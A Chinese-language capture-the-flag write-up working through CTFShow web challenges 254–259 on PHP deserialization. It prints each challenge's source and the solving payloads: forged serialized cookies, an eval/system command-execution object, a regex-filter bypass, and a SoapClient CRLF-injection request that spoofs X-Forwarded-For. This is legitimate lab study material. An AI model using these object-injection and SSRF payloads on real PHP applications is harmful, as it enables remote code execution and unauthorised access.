---
title: "CTFShow web入门 PHP反序列化"
date: 2022-05-13 19:13:19
---
# web254

查看一下源代码：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){//判断传入的username与password是否与类内的变量一致
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];//采用get方式传参
$password=$_GET['password'];

if(isset($username) && isset($password)){ //isset() 函数用于检测变量是否已设置并且非 NULL,如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。
    $user = new ctfShowUser();                  
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

本题的过关思路非常明确，只要采用get方式传入username和password即可

`http://e1a42de1-2eea-4e60-8e59-6195fa9e579e.challenge.ctf.show/?username=xxxxxx&&password=xxxxxx`

# web255

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    //此处的unserialize()进行了反序列化
    if($user->login($username,$password)){
        if($user->checkVip()){               //将isVip序列化为true即可
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

由此我们可以清楚的知道解题思路：

利用cookie传入我们构造好的序列化对象，通过get传入username和password即可

```php
<?php
class ctfShowUser{
    public $isVip=true;
}
echo urlencode(serialize(new ctfShowUser()));
```

url: `http://7d0b2d32-8a9e-407a-8ff1-7f9b79c1ddf5.challenge.ctf.show/?username=xxxxxx&&password=xxxxxx`

cookie:`user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D`

# web256

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){   //此处若username不等于password则为True
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

反序列化的宗旨就是通过类内的属性来改变类的方法。

利用cookie传入我们构造好的序列化对象，更改username与password的值即可，通过get传入我们设定好的username和password即可

```php
<?php
class ctfShowUser{
    public $username='1';
    public $password='2';
    public $isVip=true;
    
}
echo urlencode(serialize(new ctfShowUser()));
```

cookie: `O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D`

url: `http://802701c6-6546-4367-9b0e-49693c504b80.challenge.ctf.show/?username=1&&password=2`

# web257

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code); //eval()函数会将字符串当作代码执行，我们可以利用这个函数读取文件
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

分析：

更改ctfShowUser中的__construct()函数时期new一个 backDoor对象，将$code变量改为我们输入指令即可

```php
<?php
class ctfShowUser{
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    private $code = 'system("cat ./flag.php");';
}
$user = new ctfShowUser();
echo(urlencode(serialize($user)));
?>
```

cookie:`O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A25%3A%22system%28%22cat+.%2Fflag.php%22%29%3B%22%3B%7D%7D`

url: `?username=xxxxxx&&password=xxxxxx`

# web258

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){  //和上一题思路是一样的就是多了一个正则表达式过滤
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```

思路：

采用将O：转换为O:+

```php
<?php
class ctfShowUser{
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    private $code = 'system("cat ./flag.php");';
}
$user = new ctfShowUser();
$a = serialize($user);
$a = str_replace('O:','O:+',$a);
echo(urlencode($a));
?>
```

cookie:`O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A25%3A%22system%28%22cat+.%2Fflag.php%22%29%3B%22%3B%7D%7D`

# web259

flag.php

```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);//explode() 函数把字符串打散为数组。
array_pop($xff);  //array_pop() 函数删除数组中的最后一个元素。
$ip = array_pop($xff);

if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);   //file_put_contents() 函数把一个字符串写入文件中。
	}
}
```

```php
<?php

highlight_file(__FILE__);

$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

1.某个实例化的类，如果调用了一个不存在的函数会去调用__call魔术方法__call会发送一个请求  
 2.CRLF \r\n  
 3.POST数据提交最常用类型Content-Type:  
 application/x-www-form-urlencoded

通过分析源码，我们可以发现要想得到flag，得需要伪造IP和Token

```php
<?php
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1:9999"));
$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求
?>
```

以下是监听得到的：

```plaintext

C:\Users\HP>nc -lvp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from LAPTOP-95PCOPS4 [127.0.0.1] 61662
POST / HTTP/1.1
Host: 127.0.0.1:9999
Connection: Keep-Alive
User-Agent: PHP-SOAP/5.4.45
Content-Type: text/xml; charset=utf-8
SOAPAction: "127.0.0.1#getFlag"
Content-Length: 376

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="127.0.0.1" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getFlag/></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

从上面可以看到， SOAPAction 处是我们的可控参数，UA处也是我们可控的变量，因此我们可以尝试注入我们自己恶意构造的CRLF即插入\r\n

由此我们构造以下代码：

```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1:9999",'user_agent'=>$ua));
$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求
?>
```

以下是我们监听的到的

```plaintext

C:\Users\HP>nc -lvp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from LAPTOP-95PCOPS4 [127.0.0.1] 62473
POST / HTTP/1.1
Host: 127.0.0.1:9999
Connection: Keep-Alive
User-Agent: ctfshow
x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1
Content-Type:application/x-www-form-urlencoded
Content-Length:13

token=ctfshow
Content-Type: text/xml; charset=utf-8
SOAPAction: "127.0.0.1#getFlag"
Content-Length: 376

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="127.0.0.1" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getFlag/></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

这里token=ctfshow 长度为13 而且为post提交  
 下方的 因为length限制不会被识别  
 这里ip因为被pop了两次以，分割所以最后只剩了127.0.0.1  
 绕过了flag.php  
 构造payload

```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1/",'location'=>"http://127.0.0.1/flag.php",'user_agent'=>$ua));
echo urlencode(serialize($client))
?>
```

```plaintext
O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A10%3A%22127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A138%3A%22ctfshow%0D%0Ax-forwarded-for%3A127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContentLength%3A13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```
